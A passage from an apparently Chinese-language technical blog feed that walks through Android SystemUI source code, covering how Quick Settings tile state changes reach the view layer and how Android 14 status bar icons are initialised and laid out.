class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tiles/WifiTile.java]</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleUpdateState</span><span class="params">(SignalState state, Object arg)</span> &#123;</span><br><span class="line">            state.state = Tile.STATE_ACTIVE;</span><br><span class="line">            state.dualTarget = <span class="literal">true</span>;</span><br><span class="line">            state.value = transientEnabling || cb.enabled;</span><br><span class="line">            state.activityIn = cb.enabled &amp;&amp; cb.activityIn;</span><br><span class="line">            state.activityOut = cb.enabled &amp;&amp; cb.activityOut;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里抽取了一些代码片段,可以看到开关后端会根据当前开关状态对 state 进行赋值,这些赋值会在后续开关视图刷新时产生作用</p><p><strong>handleUpdateState</strong>函数收集完开关状态后,我们回到前面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileImpl.java]</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleRefreshState</span><span class="params">(Object arg)</span> &#123;</span><br><span class="line">        handleUpdateState(mTmpState, arg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> mTmpState.copyTo(mState);</span><br><span class="line">        <span class="keyword">if</span> (changed) &#123;</span><br><span class="line">            handleStateChanged();</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到假如开关状态发生了改变则会导致 <strong>handleStateChanged()</strong> 被调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileImpl.java]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleStateChanged</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mCallbacks.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mCallbacks.size(); i++) &#123;</span><br><span class="line">                mCallbacks.get(i).onStateChanged(mState);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就和前面 2.2 小节关联起来了,即 <strong>state会被传递到视图层</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[packages/SystemUI/src/com/android/systemui/qs/tileimpl/QSTileBaseView.java]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(QSTile.State state)</span> &#123;</span><br><span class="line">        mHandler.obtainMessage(H.STATE_CHANGED, state).sendToTarget();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">H</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">STATE_CHANGED</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">H</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(Looper.getMainLooper());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg.what == STATE_CHANGED) &#123;</span><br><span class="line">                handleStateChanged((QSTile.State) msg.obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>handleStateChanged</strong>函数不展开讲,该函数是真正做开关视图显示刷新的地方,细节看源码。</p><p>至此,我们就将开关点击背后的流程梳理清楚了,相信阅读完这三条主线的代码流程后,对整个QS面板的整体实现就很清晰了</p><h3 id="设计思考"><a href="#设计思考" class="headerlink" title="设计思考"></a>设计思考</h3><p>阅读前面 2.3小节的代码我们可以看到,不管是在Tile的逻辑层还是视图层,其内部均通过Handler来组织开关的状态刷新,因为整个QS面板有各种各样的开关,各个开关的刷新时机是不确定的,而通过消息机制则可以有条不紊得将所有开关的刷新有序组织起来,这里体现了Android中很重要的一个特性-<strong>有序性</strong>,这是我们值得借鉴和参考的.</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android14 StatusBar顶部图标加载流程</title>
      <link href="/2024/01/28/2024-01-28/"/>
      <url>/2024/01/28/2024-01-28/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说到 StatusBar 的顶部图标，就不得不提起以下两个类：</p><ul><li>PhoneStatusBarPolicy：定义了系统通知图标的设置策略；</li><li>StatusBarSignalPolicy：定义了状态栏网络信号策略；</li></ul><p><strong>StatusBarSignalPolicy</strong> 前面有过分析，这次以 PhoneStatusBarPolicy 为例进行分析；<br>PhoneStatusBarPolicy 在 CentralSurfacesImpl 的 start() 方法里初始化：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    mStatusBarSignalPolicy.init();  <span class="comment">// 这里Android 14 与前面 Android 11 的初始化方法有点不同。</span></span><br><span class="line">    <span class="comment">// 创建整个SystemUI视图并添加到WindowManager中</span></span><br><span class="line">    createAndAddWindows(result);<span class="comment">//这个重点方法，创建相关的视图</span></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 调用图标策略来显示更新所有图标。</span></span><br><span class="line">    mIconPolicy.init();</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接看PhoneStatusBarPolicy#init() 这个方法很关键<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBarPolicy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 注册广播监听。</span></span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">    <span class="comment">// 耳机是否插入</span></span><br><span class="line">    filter.addAction(AudioManager.ACTION_HEADSET_PLUG);</span><br><span class="line">    <span class="comment">// SIM卡广播</span></span><br><span class="line">    filter.addAction(Intent.ACTION_SIM_STATE_CHANGED);</span><br><span class="line">    <span class="comment">// TTY 模式已更改，（文字电话）</span></span><br><span class="line">    filter.addAction(TelecomManager.ACTION_CURRENT_TTY_MODE_CHANGED);</span><br><span class="line">    <span class="comment">// 可用 配置文件</span></span><br><span class="line">    filter.addAction(Intent.ACTION_MANAGED_PROFILE_AVAILABLE);</span><br><span class="line">    <span class="comment">// 不可用 配置文件</span></span><br><span class="line">    filter.addAction(Intent.ACTION_MANAGED_PROFILE_UNAVAILABLE);</span><br><span class="line">    <span class="comment">// 删除 配置文件</span></span><br><span class="line">    filter.addAction(Intent.ACTION_MANAGED_PROFILE_REMOVED);</span><br><span class="line">    <span class="comment">/// 添加用户切换操作以更新可能的警报图标</span></span><br><span class="line">    filter.addAction(Intent.ACTION_USER_SWITCHED);</span><br><span class="line">    <span class="comment">// 向处理程序注册接收器</span></span><br><span class="line">    mBroadcastDispatcher.registerReceiverWithHandler(mIntentReceiver, filter, mHandler,UserHandle.ALL);</span><br><span class="line">    <span class="comment">// 注册闹钟已更改</span></span><br><span class="line">    registerAlarmClockChanged(UserHandle.USER_OWNER, <span class="literal">false</span>);</span><br><span class="line">    Observer&lt;Integer&gt; observer = ringer -&gt; mHandler.post(<span class="built_in">this</span>::updateVolumeZen);</span><br><span class="line">    mRingerModeTracker.getRingerMode().observeForever(observer);</span><br><span class="line">    mRingerModeTracker.getRingerModeInternal().observeForever(observer);</span><br><span class="line">    <span class="comment">// 监听用户配置文件更改.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mIActivityManager.registerUserSwitchObserver(mUserSwitchListener, TAG);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// Ignore</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TTY状态</span></span><br><span class="line">    updateTTY();</span><br><span class="line">    <span class="comment">// 蓝牙状态</span></span><br><span class="line">    updateBluetooth();</span><br><span class="line">    <span class="comment">//eMBMS状态</span></span><br><span class="line">    mIconController.setIcon(mSlotEmbms, R.drawable.stat_sys_embms, <span class="literal">null</span>);</span><br><span class="line">    mIconController.setIconVisibility(mSlotEmbms, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 闹钟</span></span><br><span class="line">    mIconController.setIcon(mSlotAlarmClock, R.drawable.stat_sys_alarm, <span class="literal">null</span>);</span><br><span class="line">    mIconController.setIconVisibility(mSlotAlarmClock, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// zen</span></span><br><span class="line">    mIconController.setIcon(mSlotZen, R.drawable.stat_sys_dnd, <span class="literal">null</span>);</span><br><span class="line">    mIconController.setIconVisibility(mSlotZen, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 振动</span></span><br><span class="line">    mIconController.setIcon(mSlotVibrate, R.drawable.stat_sys_ringer_vibrate,</span><br><span class="line">            mResources.getString(R.string.accessibility_ringer_vibrate));</span><br><span class="line">    mIconController.setIconVisibility(mSlotVibrate, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// mute</span></span><br><span class="line">    mIconController.setIcon(mSlotMute, R.drawable.stat_sys_ringer_silent,</span><br><span class="line">            mResources.getString(R.string.accessibility_ringer_silent));</span><br><span class="line">    mIconController.setIconVisibility(mSlotMute, <span class="literal">false</span>);</span><br><span class="line">    updateVolumeZen();</span><br><span class="line">    <span class="comment">// cast</span></span><br><span class="line">    mIconController.setIcon(mSlotCast, R.drawable.stat_sys_cast, <span class="literal">null</span>);</span><br><span class="line">    mIconController.setIconVisibility(mSlotCast, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 热点</span></span><br><span class="line">    mIconController.setIcon(mSlotHotspot, R.drawable.stat_sys_hotspot,</span><br><span class="line">            mResources.getString(R.string.accessibility_status_bar_hotspot));</span><br><span class="line">    mIconController.setIconVisibility(mSlotHotspot, mHotspot.isHotspotEnabled());</span><br><span class="line">    <span class="comment">// managed profile</span></span><br><span class="line">    updateManagedProfile();</span><br><span class="line">    <span class="comment">// 数据保护程序</span></span><br><span class="line">    mIconController.setIcon(mSlotDataSaver, R.drawable.stat_sys_data_saver,</span><br><span class="line">            mResources.getString(R.string.accessibility_data_saver_on));</span><br><span class="line">    mIconController.setIconVisibility(mSlotDataSaver, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 隐私 items</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">microphoneString</span> <span class="operator">=</span> mResources.getString(PrivacyType.TYPE_MICROPHONE.getNameId());</span><br><span class="line">    <span class="type">String</span> <span class="variable">microphoneDesc</span> <span class="operator">=</span> mResources.getString(</span><br><span class="line">            R.string.ongoing_privacy_chip_content_multiple_apps, microphoneString);</span><br><span class="line">    mIconController.setIcon(mSlotMicrophone, PrivacyType.TYPE_MICROPHONE.getIconId(),</span><br><span class="line">            microphoneDesc);</span><br><span class="line">    mIconController.setIconVisibility(mSlotMicrophone, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cameraString</span> <span class="operator">=</span> mResources.getString(PrivacyType.TYPE_CAMERA.getNameId());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cameraDesc</span> <span class="operator">=</span> mResources.getString(</span><br><span class="line">            R.string.ongoing_privacy_chip_content_multiple_apps, cameraString);</span><br><span class="line">    mIconController.setIcon(mSlotCamera, PrivacyType.TYPE_CAMERA.getIconId(),</span><br><span class="line">            cameraDesc);</span><br><span class="line">    mIconController.setIconVisibility(mSlotCamera, <span class="literal">false</span>);</span><br><span class="line">    mIconController.setIcon(mSlotLocation, LOCATION_STATUS_ICON_ID,</span><br><span class="line">            mResources.getString(R.string.accessibility_location_active));</span><br><span class="line">    mIconController.setIconVisibility(mSlotLocation, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 传感器关闭</span></span><br><span class="line">    mIconController.setIcon(mSlotSensorsOff, R.drawable.stat_sys_sensors_off,</span><br><span class="line">            mResources.getString(R.string.accessibility_sensors_off_active));</span><br><span class="line">    mIconController.setIconVisibility(mSlotSensorsOff,</span><br><span class="line">            mSensorPrivacyController.isSensorPrivacyEnabled());</span><br><span class="line">    <span class="comment">// 录屏</span></span><br><span class="line">    mIconController.setIcon(mSlotScreenRecord, R.drawable.stat_sys_screen_record, <span class="literal">null</span>);</span><br><span class="line">    mIconController.setIconVisibility(mSlotScreenRecord, <span class="literal">false</span>);</span><br><span class="line">    mRotationLockController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mBluetooth.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mProvisionedController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mZenController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mCast.addCallback(mCastCallback);</span><br><span class="line">    mHotspot.addCallback(mHotspotCallback);</span><br><span class="line">    mNextAlarmController.addCallback(mNextAlarmCallback);</span><br><span class="line">    mDataSaver.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mKeyguardStateController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mPrivacyItemController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mSensorPrivacyController.addCallback(mSensorPrivacyListener);</span><br><span class="line">    mLocationController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mRecordingController.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mCommandQueue.addCallback(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个icon对应一个updatexxx()，依靠监听和回调机制，可以实现控制状态栏icon图标的显示、隐藏。<br>上述就是图标的加载显示和移除了，那么布局又是在哪添加的呢？？</p><hr><p>下面接着看 CollapsedStatusBarFragment ，启动方式前面讲过，这里不在重复；看其的 onViewCreated():<br><strong>CollapsedStatusBarFragment #onViewCreated()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/fragment/CollapsedStatusBarFragment.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewCreated</span><span class="params">(View view, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onViewCreated(view, savedInstanceState);</span><br><span class="line">    mStatusBarFragmentComponent = mStatusBarFragmentComponentFactory.create(<span class="built_in">this</span>);</span><br><span class="line">    mStatusBarFragmentComponent.init();</span><br><span class="line">    mStatusBar = (PhoneStatusBarView) view;</span><br><span class="line">    <span class="type">View</span> <span class="variable">contents</span> <span class="operator">=</span> mStatusBar.findViewById(R.id.status_bar_contents);</span><br><span class="line">    contents.addOnLayoutChangeListener(mStatusBarLayoutListener);</span><br><span class="line">    updateStatusBarLocation(contents.getLeft(), contents.getRight());</span><br><span class="line">    <span class="keyword">if</span> (savedInstanceState != <span class="literal">null</span> &amp;&amp; savedInstanceState.containsKey(EXTRA_PANEL_STATE)) &#123;</span><br><span class="line">        mStatusBar.restoreHierarchyState(</span><br><span class="line">                savedInstanceState.getSparseParcelableArray(EXTRA_PANEL_STATE));</span><br><span class="line">    &#125;</span><br><span class="line">    mDarkIconManager = <span class="keyword">new</span> <span class="title class_">DarkIconManager</span>(view.findViewById(R.id.statusIcons), mFeatureFlags);</span><br><span class="line">    mDarkIconManager.setShouldLog(<span class="literal">true</span>);</span><br><span class="line">    updateBlockedIcons();</span><br><span class="line">    mStatusBarIconController.addIconGroup(mDarkIconManager);</span><br><span class="line">    mSystemIconArea = mStatusBar.findViewById(R.id.system_icon_area);</span><br><span class="line">    mClockView = mStatusBar.findViewById(R.id.clock);</span><br><span class="line">    mOngoingCallChip = mStatusBar.findViewById(R.id.ongoing_call_chip);</span><br><span class="line">    showSystemIconArea(<span class="literal">false</span>);</span><br><span class="line">    showClock(<span class="literal">false</span>);</span><br><span class="line">    initEmergencyCryptkeeperText();</span><br><span class="line">    initOperatorName();</span><br><span class="line">    initNotificationIconArea();</span><br><span class="line">    mSystemEventAnimator =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">StatusBarSystemEventAnimator</span>(mSystemIconArea, getResources());</span><br><span class="line">    mCarrierConfigTracker.addCallback(mCarrierConfigCallback);</span><br><span class="line">    mCarrierConfigTracker.addDefaultDataSubscriptionChangedListener(mDefaultDataListener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>补充：在 status_bar.xml 中</strong></p><ul><li>system_icon_area：就是显示蓝牙、wifi、VPN、网卡icon那块区域。</li></ul><p>接下来注意这几句代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mDarkIconManager = <span class="keyword">new</span> <span class="title class_">DarkIconManager</span>(view.findViewById(R.id.statusIcons), mFeatureFlags);</span><br><span class="line">mDarkIconManager.setShouldLog(<span class="literal">true</span>);</span><br><span class="line">updateBlockedIcons();</span><br><span class="line"><span class="comment">// 添加图标组</span></span><br><span class="line">mStatusBarIconController.addIconGroup(mDarkIconManager);</span><br></pre></td></tr></table></figure><p>上述 <strong>R.id.statusIcons</strong> 即是 <strong>system_icons.xml</strong> 里面的控件。<br><strong>frameworks/base/packages/SystemUI/res/layout/system_icons.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:systemui</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/system_icons&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical|end&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">&quot;center_vertical&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.android.systemui.statusbar.phone.StatusIconContainer</span> <span class="attr">android:id</span>=<span class="string">&quot;@+id/statusIcons&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:paddingEnd</span>=<span class="string">&quot;@dimen/signal_cluster_battery_padding&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.android.systemui.battery.BatteryMeterView</span> <span class="attr">android:id</span>=<span class="string">&quot;@+id/battery&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clipToPadding</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clipChildren</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">systemui:textAppearance</span>=<span class="string">&quot;@style/TextAppearance.StatusBar.Clock&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们接着看 <strong>StatusBarIconControllerImpl</strong> 的构造函数，因为 <strong>mStatusBarIconController</strong> 是一个接口，而其的实现类是 <strong>StatusBarIconControllerImpl</strong>。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarIconControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">StatusBarIconControllerImpl</span><span class="params">(</span></span><br><span class="line"><span class="params">        Context context,</span></span><br><span class="line"><span class="params">        CommandQueue commandQueue,</span></span><br><span class="line"><span class="params">        DemoModeController demoModeController,</span></span><br><span class="line"><span class="params">        ConfigurationController configurationController,</span></span><br><span class="line"><span class="params">        TunerService tunerService,</span></span><br><span class="line"><span class="params">        DumpManager dumpManager)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(context.getResources().getStringArray(</span><br><span class="line">            com.android.internal.R.array.config_statusBarIcons),context);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现状态栏 icon 加载的图标来源于 <strong>framework/base/core/res/res/values/config.xml</strong> 文件在这里我们就找到了 index 和 slot 的出处，原来在初始化的时候就已经定义好了所有的 slots，然后从 framework 中加载出来，index 就是 string-array 中的顺序。<br><strong>frameworks/base/core/res/res/values/config.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;config_statusBarIcons&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_alarm_clock<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_rotate<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_headset<span class="tag">&lt;/<span class="name">xliff:g</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">xliff:g</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>@string/status_bar_data_saver<span class="tag">&lt;/<span 